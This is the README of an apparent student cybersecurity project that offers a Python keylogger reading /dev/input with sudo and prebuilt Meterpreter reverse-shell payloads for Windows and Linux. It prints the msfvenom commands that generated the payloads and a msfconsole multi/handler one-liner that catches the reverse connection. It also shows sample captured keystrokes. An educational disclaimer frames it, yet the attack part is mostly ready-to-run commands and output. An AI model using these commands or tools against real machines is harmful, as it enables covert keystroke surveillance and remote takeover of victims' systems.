# Cyber Security Major Project

![Python](https://img.shields.io/badge/Python-3.12-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-333333?style=for-the-badge&logo=kali-linux&logoColor=white)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Educational-orange?style=for-the-badge)

This repository contains the source code, payloads, and documentation for my Major Project in Cyber Security. The project focuses on offensive security methodologies, specifically **Malware Creation/Analysis** and **Keylogging**, to demonstrate system vulnerabilities and the mechanics of user surveillance.

> **DISCLAIMER: For Educational Purposes Only** > This code is intended for authorized security testing and educational contexts only. Misuse of this software to violate the law, invade privacy, or target systems without explicit permission is strictly prohibited.

---

## Project Structure

```text
.
├── keylogger.py        # Python script for kernel-level keylogging
├── keylog.txt          # Output file storing captured keystrokes
├── payload.elf         # Meterpreter payload for Linux (x86)
├── payload.exe         # Meterpreter payload for Windows
├── requirements.txt    # Python dependencies
└── test.py             # Testing utility

```

---

## Installation & Setup

To deploy this project in a testing environment (preferably Kali Linux), follow the steps below.

### 1. Clone the repository

```bash
git clone [https://github.com/Neko01t/cyber-security-project](https://github.com/Neko01t/cyber-security-project)
cd cyber-security-project
```

### 2. Install Python Dependencies

Ensure you have Python 3 installed.

```bash
pip install -r requirements.txt

```

---

## Component 1: Python Keylogger

This module implements a keylogger using Python. It is designed to hook into input devices and capture keystrokes in real-time, saving them to a local file.

### Usage

Run the script using Python. **Note:** Because this script hooks into `/dev/input/` on Linux, it requires `sudo` privileges.

```bash
sudo python keylogger.py

```

### Console Output

Upon execution, the script identifies the active input interface (e.g., Wayland/Kernel Level) and begins listening.

```text
[*] Mode: WAYLAND (Kernel Level). Hooking /dev/input/event3...
[*] Success! Listening on: AT Translated Set 2 keyboard
[*] Press CTRL+C to stop.
testkeylogger[CAPS][CAPS]V$
[BSP][NUMLOCK]        [NUMLOCK][LEFTCTRL]C

```

### Log File Output (`keylog.txt`)

The logger formats special keys (Control, CapsLock) for readability and timestamps the session start and stop times.

```text
--- Started logging at 2026-01-22 18:10:40.396958 ---
testkeylogger[CAPS][CAPS]V$
[BSP][NUMLOCK]    [NUMLOCK][LEFTCTRL]C
[LEFTCTRL]v
[LEFTCTRL]c
--- Started logging at 2026-01-22 18:11:15.042080 ---
[LEFTCTRL]c

```

---

## Component 2: Malware Analysis (Metasploit)

This section details the creation of malicious payloads using `msfvenom` and the establishment of a command-and-control session using `msfconsole`.

### Payload Architecture

You will observe two distinct payloads in the root directory:

- `payload.exe` (Target: Windows)
- `payload.elf` (Target: Linux)

**Why two payloads?** My primary development environment is **Linux**. While the project requires understanding Windows exploitation, I generated the `.elf` binary to verify reverse shell functionality locally on my own machine. The `.exe` is included to demonstrate the ability to generate cross-platform threats.

### Payload Generation Commands

The following commands were used to generate the artifacts found in this repo:

**Windows Payload:**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.32.50 LPORT=4444 -f exe > payload.exe

```

**Linux Payload:**

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.32.50 LPORT=4444 -f elf > payload.elf

```

### Listener Configuration

To establish the reverse connection, the following one-liner was used to start the Metasploit listener with the correct parameters:

```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.32.50; set LPORT 4444; run"

```

---

## Project Topics Fulfilled

This project addresses the following Major Project requirements:

1.  **Create a code in Python for a Keylogger**.

2.  **Create a malware using Metasploit and perform a static and dynamic analysis**.

```

```
